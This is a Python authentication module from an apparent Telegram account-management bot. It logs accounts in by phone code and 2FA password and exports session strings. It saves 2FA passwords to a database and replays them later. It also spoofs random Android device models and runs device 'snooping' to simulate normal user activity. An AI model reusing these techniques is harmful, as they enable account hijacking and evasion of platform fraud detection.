"""Authentication handler with OTP destroyer functionality
Developed by:
- @Meher_Mankar
- @Gutkesh
GitHub: https://github.com/mehermankar/teleguard
Support: https://t.me/ContactXYZrobot
"""
import asyncio
import logging
import os
import tempfile
import time
import random
from typing import Dict, Optional
from telethon import TelegramClient
from telethon.errors import PhoneCodeInvalidError, SessionPasswordNeededError, PhoneCodeExpiredError
from telethon.errors.rpcerrorlist import PasswordHashInvalidError
from telethon.sessions import StringSession
from ..core.config import config
from ..utils.network_helpers import retry_async
from ..core.device_snooper import DeviceSnooper
from ..core.mongo_database import mongodb

logger = logging.getLogger(__name__)

class OTPDestroyer:
    """Handles OTP destruction using two-client authentication pattern"""
    def __init__(self):
        self._temp_sessions: Dict[str, str] = {}

    async def destroy_otp(self, phone: str, code: str) -> bool:
        """Destroy/consume OTP code to make it unusable"""
        temp_session_file = None
        client = None
        try:
            temp_session_file = self._create_temp_session()
            client = TelegramClient(temp_session_file, config.telegram.api_id, config.telegram.api_hash)
            await retry_async(client.connect)
            # Request and immediately consume the OTP
            sent_code = await retry_async(client.send_code_request, phone)
            try:
                await client.sign_in(
                    phone=phone, code=code, phone_code_hash=sent_code.phone_code_hash
                )
            except Exception:
                pass  # Code consumed regardless of success/failure
            logger.info(f"OTP code destroyed for {phone}")
            return True
        except Exception as e:
            logger.error(f"Failed to destroy OTP for {phone}: {e}")
            raise
        finally:
            await self._cleanup_resources(client, temp_session_file)

    def _create_temp_session(self) -> str:
        """Create temporary session file"""
        temp_session = tempfile.NamedTemporaryFile(delete=False, suffix=".session")
        temp_session.close()
        return temp_session.name

    async def _cleanup_resources(
        self, client: Optional[TelegramClient], session_file: Optional[str]
    ):
        """Clean up client and session file resources"""
        # Disconnect client
        if client:
            try:
                if client.is_connected():
                    await client.disconnect()
            except Exception as e:
                logger.error(f"Error disconnecting client: {e}")
        if session_file:
            try:
                if os.path.exists(session_file):
                    os.unlink(session_file)
            except OSError as e:
                logger.error(f"Error removing session file {session_file}: {e}")

    async def start_phone_auth(self, phone: str) -> Dict[str, any]:
        """Initialize phone authentication and request OTP"""
        temp_session_file = None
        client = None
        try:
            temp_session_file = self._create_temp_session()
            client = TelegramClient(temp_session_file, config.telegram.api_id, config.telegram.api_hash)
            await retry_async(client.connect)
            sent_code = await retry_async(client.send_code_request, phone)
            return {
                "phone": phone,
                "phone_code_hash": sent_code.phone_code_hash,
                "session_file": temp_session_file,
                "client": client,
            }
        except Exception as e:
            await self._cleanup_resources(client, temp_session_file)
            logger.error(f"Failed to start phone auth for {phone}: {e}")
            raise

    async def verify_code(
        self, auth_data: Dict[str, any], code: str, password: Optional[str] = None
    ) -> str:
        """Verify and destroy OTP code"""
        client = auth_data.get("client")
        session_file = auth_data.get("session_file")
        try:
            # Consume the OTP code
            await client.sign_in(
                phone=auth_data["phone"],
                code=code,
                phone_code_hash=auth_data["phone_code_hash"],
            )
        except SessionPasswordNeededError:
            if password:
                await client.sign_in(password=password)
        except Exception:
            pass  # Code consumed regardless of outcome
        finally:
            await self._cleanup_resources(client, session_file)
        return "OTP_DESTROYED"

class AuthManager:
    """Manages authentication states and OTP destruction for multiple users"""
    def __init__(self, bot_manager=None):
        self._pending_auths: Dict[int, Dict[str, any]] = {}
        self._otp_destroyer = OTPDestroyer()
        self.MAX_2FA_ATTEMPTS = 5
        self.COOLDOWN_SECONDS = 10
        self.bot_manager = bot_manager
        self.device_snooper = DeviceSnooper(mongodb) if mongodb else None
        
        # Android API credentials only
        self.api_credentials = {
            "android": {
                "api_id": config.telegram.api_id,
                "api_hash": config.telegram.api_hash
            }
        }
        # Android device profiles only
        self.devices = [
            # Samsung Galaxy Series
            {"model": "SM-G973F", "system": "Android 10", "version": "10.14.5"},
            {"model": "SM-G975F", "system": "Android 11", "version": "10.14.5"},
            {"model": "SM-G980F", "system": "Android 11", "version": "10.14.5"},
            {"model": "SM-G981B", "system": "Android 11", "version": "10.14.5"},
            {"model": "SM-G991B", "system": "Android 12", "version": "10.14.5"},
            {"model": "SM-G996B", "system": "Android 12", "version": "10.14.5"},
            {"model": "SM-G998B", "system": "Android 13", "version": "10.14.5"},
            {"model": "SM-S901B", "system": "Android 13", "version": "10.14.5"},
            {"model": "SM-S906B", "system": "Android 13", "version": "10.14.5"},
            {"model": "SM-S908B", "system": "Android 13", "version": "10.14.5"},
            {"model": "SM-A525F", "system": "Android 12", "version": "10.14.5"},
            {"model": "SM-A715F", "system": "Android 11", "version": "10.14.5"},
            {"model": "SM-A515F", "system": "Android 11", "version": "10.14.5"},
            {"model": "SM-A315G", "system": "Android 10", "version": "10.14.5"},
            {"model": "SM-M515F", "system": "Android 11", "version": "10.14.5"},
            {"model": "SM-N975F", "system": "Android 10", "version": "10.14.5"},
            {"model": "SM-N986B", "system": "Android 11", "version": "10.14.5"},
            {"model": "SM-N981B", "system": "Android 12", "version": "10.14.5"},
            # Google Pixel Series
            {"model": "Pixel 4", "system": "Android 11", "version": "10.14.5"},
            {"model": "Pixel 4a", "system": "Android 12", "version": "10.14.5"},
            {"model": "Pixel 5", "system": "Android 12", "version": "10.14.5"},
            {"model": "Pixel 6", "system": "Android 13", "version": "10.14.5"},
            {"model": "Pixel 6 Pro", "system": "Android 13", "version": "10.14.5"},
            {"model": "Pixel 7", "system": "Android 14", "version": "10.14.5"},
            {"model": "Pixel 7 Pro", "system": "Android 14", "version": "10.14.5"},
            {"model": "Pixel 8", "system": "Android 14", "version": "10.14.5"},
            {"model": "Pixel 8 Pro", "system": "Android 14", "version": "10.14.5"},
            # OnePlus Series
            {"model": "OnePlus 8", "system": "Android 11", "version": "10.14.5"},
            {"model": "OnePlus 8 Pro", "system": "Android 11", "version": "10.14.5"},
            {"model": "OnePlus 9", "system": "Android 12", "version": "10.14.5"},
            {"model": "OnePlus 9 Pro", "system": "Android 12", "version": "10.14.5"},
            {"model": "OnePlus 10 Pro", "system": "Android 13", "version": "10.14.5"},
            {"model": "OnePlus 11", "system": "Android 13", "version": "10.14.5"},
            {"model": "OnePlus Nord", "system": "Android 11", "version": "10.14.5"},
            {"model": "OnePlus Nord 2", "system": "Android 12", "version": "10.14.5"},
            {"model": "OnePlus Nord CE", "system": "Android 11", "version": "10.14.5"},
            # Xiaomi Series
            {"model": "Xiaomi Mi 10", "system": "Android 11", "version": "10.14.5"},
            {"model": "Xiaomi Mi 11", "system": "Android 11", "version": "10.14.5"},
            {"model": "Xiaomi Mi 12", "system": "Android 12", "version": "10.14.5"},
            {"model": "Xiaomi 13", "system": "Android 13", "version": "10.14.5"},
            {"model": "Xiaomi 13 Pro", "system": "Android 13", "version": "10.14.5"},
            {"model": "Xiaomi Redmi Note 9", "system": "Android 10", "version": "10.14.5"},
            {"model": "Xiaomi Redmi Note 10", "system": "Android 11", "version": "10.14.5"},
            {"model": "Xiaomi Redmi Note 11", "system": "Android 11", "version": "10.14.5"},
            {"model": "Xiaomi Redmi Note 12", "system": "Android 12", "version": "10.14.5"},
            {"model": "Xiaomi POCO F3", "system": "Android 11", "version": "10.14.5"},
            {"model": "Xiaomi POCO X3", "system": "Android 10", "version": "10.14.5"},
            {"model": "Xiaomi Black Shark 4", "system": "Android 11", "version": "10.14.5"},
        ]

    async def destroy_otp_code(self, phone: str, code: str) -> bool:
        """Legacy method - now handled by invalidateSignInCodes in bot"""
        logger.info(f"Legacy destroy_otp_code called for {phone}")
        return True  # Always return True since real destruction happens in bot

    async def start_auth(
        self, user_id: int, phone: str, use_otp_destroyer: bool = False
    ) -> bool:
        """Start authentication process for a user"""
        # Clean up any existing auth for this user
        if user_id in self._pending_auths:
            self.cancel_auth(user_id)
        try:
            if use_otp_destroyer:
                auth_data = await self._otp_destroyer.start_phone_auth(phone)
                self._pending_auths[user_id] = {
                    "type": "destroy_mode",
                    "data": auth_data,
                    "created_at": time.time()
                }
            else:
                auth_data = await self._start_normal_auth(phone)
                self._pending_auths[user_id] = {
                    "type": "normal", 
                    "data": auth_data,
                    "attempts": 0,
                    "created_at": time.time(),
                    "locked_until": None
                }
            return True
        except Exception as e:
            self._pending_auths.pop(user_id, None)
            logger.error(f"Failed to start auth for {phone}: {e}")
            # Send user-friendly error message
            if self.bot_manager and self.bot_manager.bot:
                from ..utils.error_handler import ErrorHandler
                await ErrorHandler.handle_account_error(
                    self.bot_manager.bot, user_id, e, phone, "authentication start"
                )
            raise

    def _get_device_type(self, device: Dict) -> str:
        """Determine device type for API selection - Android only"""
        return "android"
    
    async def _start_normal_auth(self, phone: str) -> Dict[str, any]:
        """Start normal authentication flow with Android device spoofing"""
        device = random.choice(self.devices)
        credentials = self.api_credentials["android"]
        
        client = TelegramClient(
            StringSession(), 
            credentials["api_id"], 
            credentials["api_hash"],
            device_model=device["model"],
            system_version=device["system"],
            app_version="10.14.5",
            lang_code="en",
            system_lang_code="en-US"
        )
        await retry_async(client.connect)
        sent_code = await retry_async(client.send_code_request, phone)
        return {
            "phone": phone,
            "phone_code_hash": sent_code.phone_code_hash,
            "client": client
        }

    async def complete_auth(
        self, user_id: int, code: Optional[str] = None, password: Optional[str] = None
    ) -> str:
        """Complete authentication flow"""
        if user_id not in self._pending_auths:
            raise ValueError("No pending authentication found")
        auth_info = self._pending_auths[user_id]
        
        # Check if auth has expired (10 minutes timeout)
        if time.time() - auth_info["created_at"] > 600:
            self.cancel_auth(user_id)
            raise ValueError("❌ Authentication session expired. Please restart the login process.")
        logger.info(f"Completing auth for user {user_id}, type: {auth_info['type']}, has_code: {code is not None}, has_password: {password is not None}")
        try:
            if auth_info["type"] == "destroy_mode":
                return await self._complete_destroy_mode(
                    user_id, auth_info, code, password
                )
            else:
                return await self._complete_normal_auth(
                    user_id, auth_info, code, password
                )
        except ValueError as e:
            # Don't clear pending auth for 2FA requirement
            if "Two-factor" in str(e):
                logger.info(f"2FA required for user {user_id}, keeping auth pending")
                # Don't log as error - this is expected behavior
                raise
            else:
                # Send user-friendly error for other ValueError cases
                if self.bot_manager and self.bot_manager.bot:
                    from ..utils.error_handler import ErrorHandler
                    await ErrorHandler.handle_account_error(
                        self.bot_manager.bot, user_id, e, 
                        auth_info.get("data", {}).get("phone", ""), "authentication completion"
                    )
                logger.error(f"Auth completion failed for user {user_id}: {e}")
                raise
        except Exception as e:
            logger.error(f"Auth completion failed for user {user_id}: {e}")
            # Send user-friendly error message
            if self.bot_manager and self.bot_manager.bot:
                from ..utils.error_handler import ErrorHandler
                await ErrorHandler.handle_account_error(
                    self.bot_manager.bot, user_id, e, 
                    auth_info.get("data", {}).get("phone", ""), "authentication completion"
                )
            raise

    async def _complete_destroy_mode(
        self, user_id: int, auth_info: Dict, code: str, password: Optional[str]
    ) -> str:
        """Complete OTP destruction"""
        self._pending_auths.pop(user_id)
        return await self._otp_destroyer.verify_code(auth_info["data"], code, password)

    async def _complete_normal_auth(
        self, user_id: int, auth_info: Dict, code: Optional[str], password: Optional[str]
    ) -> str:
        """Complete normal authentication"""
        client = auth_info["data"]["client"]
        phone = auth_info["data"]["phone"]
        try:
            if password:
                now = time.time()
                if auth_info.get("locked_until") and now < auth_info["locked_until"]:
                    wait = int(auth_info["locked_until"] - now)
                    raise ValueError(f"Too many failed attempts. Try again in {wait}s.")
                # 2FA step - client should already be in 2FA state
                try:
                    await client.sign_in(password=password)
                    # Store 2FA password automatically
                    try:
                        from ..core.database_manager import db_manager
                        account = await mongodb.db.accounts.find_one({"user_id": user_id, "phone": phone})
                        if account:
                            await db_manager.store_2fa_password(user_id, str(account['_id']), password)
                    except Exception as e:
                        logger.error(f"Failed to store 2FA password: {e}")
                    # Immediately snoop devices to simulate normal user activity
                    if self.bot_manager and self.device_snooper:
                        await self._immediate_snoop_after_login(user_id, client)
                    # Success - clean up and return session
                    self._pending_auths.pop(user_id)
                    session_string = StringSession.save(client.session)
                    
                    await client.disconnect()
                    return session_string
                except PasswordHashInvalidError:
                    # Wrong password - increment attempts
                    auth_info["attempts"] += 1
                    remaining = self.MAX_2FA_ATTEMPTS - auth_info["attempts"]
                    if remaining <= 0:
                        # Too many attempts - clear state and disconnect
                        self._pending_auths.pop(user_id, None)
                        try:
                            await client.disconnect()
                        except Exception:
                            pass
                        raise ValueError("Too many incorrect attempts. Please restart login.")
                    else:
                        # Apply cooldown and keep session alive
                        auth_info["locked_until"] = time.time() + self.COOLDOWN_SECONDS
                        raise ValueError(f"❌ Incorrect password. {remaining} attempts left. Wait {self.COOLDOWN_SECONDS}s.")
            elif code:
                # OTP step
                try:
                    await client.sign_in(
                        phone=auth_info["data"]["phone"],
                        code=code,
                        phone_code_hash=auth_info["data"]["phone_code_hash"],
                    )
                    # Immediately snoop devices to simulate normal user activity
                    if self.bot_manager and self.device_snooper:
                        await self._immediate_snoop_after_login(user_id, client)
                    # Success - clean up and return session
                    self._pending_auths.pop(user_id)
                    session_string = StringSession.save(client.session)
                    
                    await client.disconnect()
                    return session_string
                except PhoneCodeInvalidError:
                    raise ValueError("❌ The code you entered is invalid or expired. Please try again.")
                except PhoneCodeExpiredError:
                    # Clear the auth and force restart
                    self.cancel_auth(user_id)
                    raise ValueError("❌ The confirmation code has expired. Please restart the login process.")
                except SessionPasswordNeededError:
                    # 2FA required - check if we have stored password first
                    try:
                        from ..core.database_manager import db_manager
                        stored_password = await db_manager.get_2fa_password_by_phone(user_id, phone)
                        if stored_password:
                            # Try with stored password
                            try:
                                await client.sign_in(password=stored_password)
                                # Immediately snoop devices to simulate normal user activity
                                if self.bot_manager and self.device_snooper:
                                    await self._immediate_snoop_after_login(user_id, client)
                                # Success - clean up and return session
                                self._pending_auths.pop(user_id)
                                session_string = StringSession.save(client.session)
                                
                                await client.disconnect()
                                return session_string
                            except Exception:
                                account = await mongodb.db.accounts.find_one({"user_id": user_id, "phone": phone})
                                if account:
                                    await db_manager.remove_2fa_password(user_id, str(account['_id']))
                                # Continue to ask for new password
                    except Exception:
                        pass
                    
                    # Send simple 2FA request without permission buttons
                    if self.bot_manager and self.bot_manager.bot:
                        await self.bot_manager.bot.send_message(
                            user_id,
                            f"🔐 **Two-factor authentication required.**\n\n"
                            f"Reply with your 2FA password."
                        )
                    

                    # 2FA required - keep client alive and pending auth
                    logger.info(f"2FA required for user {user_id}, keeping client session alive")
                    raise ValueError("Two-factor authentication password required")
            else:
                raise ValueError("Either code or password must be provided")
        except SessionPasswordNeededError:
            # 2FA required - keep client alive and pending auth
            logger.info(f"2FA required for user {user_id}, keeping client session alive")
            raise ValueError("Two-factor authentication password required")
        except PasswordHashInvalidError:
            # This is handled above in the password section
            raise
        except Exception as e:
            # Only clear pending auth and disconnect for non-2FA/non-password errors
            if "Two-factor" not in str(e) and "attempts" not in str(e) and "Incorrect password" not in str(e):
                self._pending_auths.pop(user_id, None)
                if client and client.is_connected():
                    await client.disconnect()
            raise

    def cancel_auth(self, user_id: int) -> bool:
        """Cancel pending authentication and cleanup resources"""
        if user_id not in self._pending_auths:
            return False
        auth_info = self._pending_auths.pop(user_id)
        try:
            if auth_info["type"] == "normal":
                client = auth_info["data"].get("client")
                if client:
                    asyncio.create_task(client.disconnect())
            else:  # destroy_mode
                client = auth_info["data"].get("client")
                session_file = auth_info["data"].get("session_file")
                if client:
                    asyncio.create_task(client.disconnect())
                if session_file and os.path.exists(session_file):
                    try:
                        os.unlink(session_file)
                    except Exception as e:
                        logger.error(f"Failed to remove session file: {e}")
            return True
        except Exception as e:
            logger.error(f"Error canceling auth for user {user_id}: {e}")
            return False

    def has_pending_auth(self, user_id: int) -> bool:
        """Check if user has pending authentication"""
        return user_id in self._pending_auths

    def get_pending_auth_type(self, user_id: int) -> Optional[str]:
        """Get type of pending authentication"""
        auth_info = self._pending_auths.get(user_id)
        return auth_info["type"] if auth_info else None

    async def _immediate_snoop_after_login(self, user_id: int, client: TelegramClient):
        """Immediately snoop devices after login to simulate normal user activity"""
        try:
            # Perform device snooping immediately while client is still connected
            # Only snoop, don't terminate any sessions during account addition
            result = await self.device_snooper.snoop_device_info(client, user_id)
            logger.info(f"Device snooping completed for user {user_id}, found {result.get('count', 0)} devices")
        except Exception as e:
            logger.error(f"Immediate device snooping failed: {e}")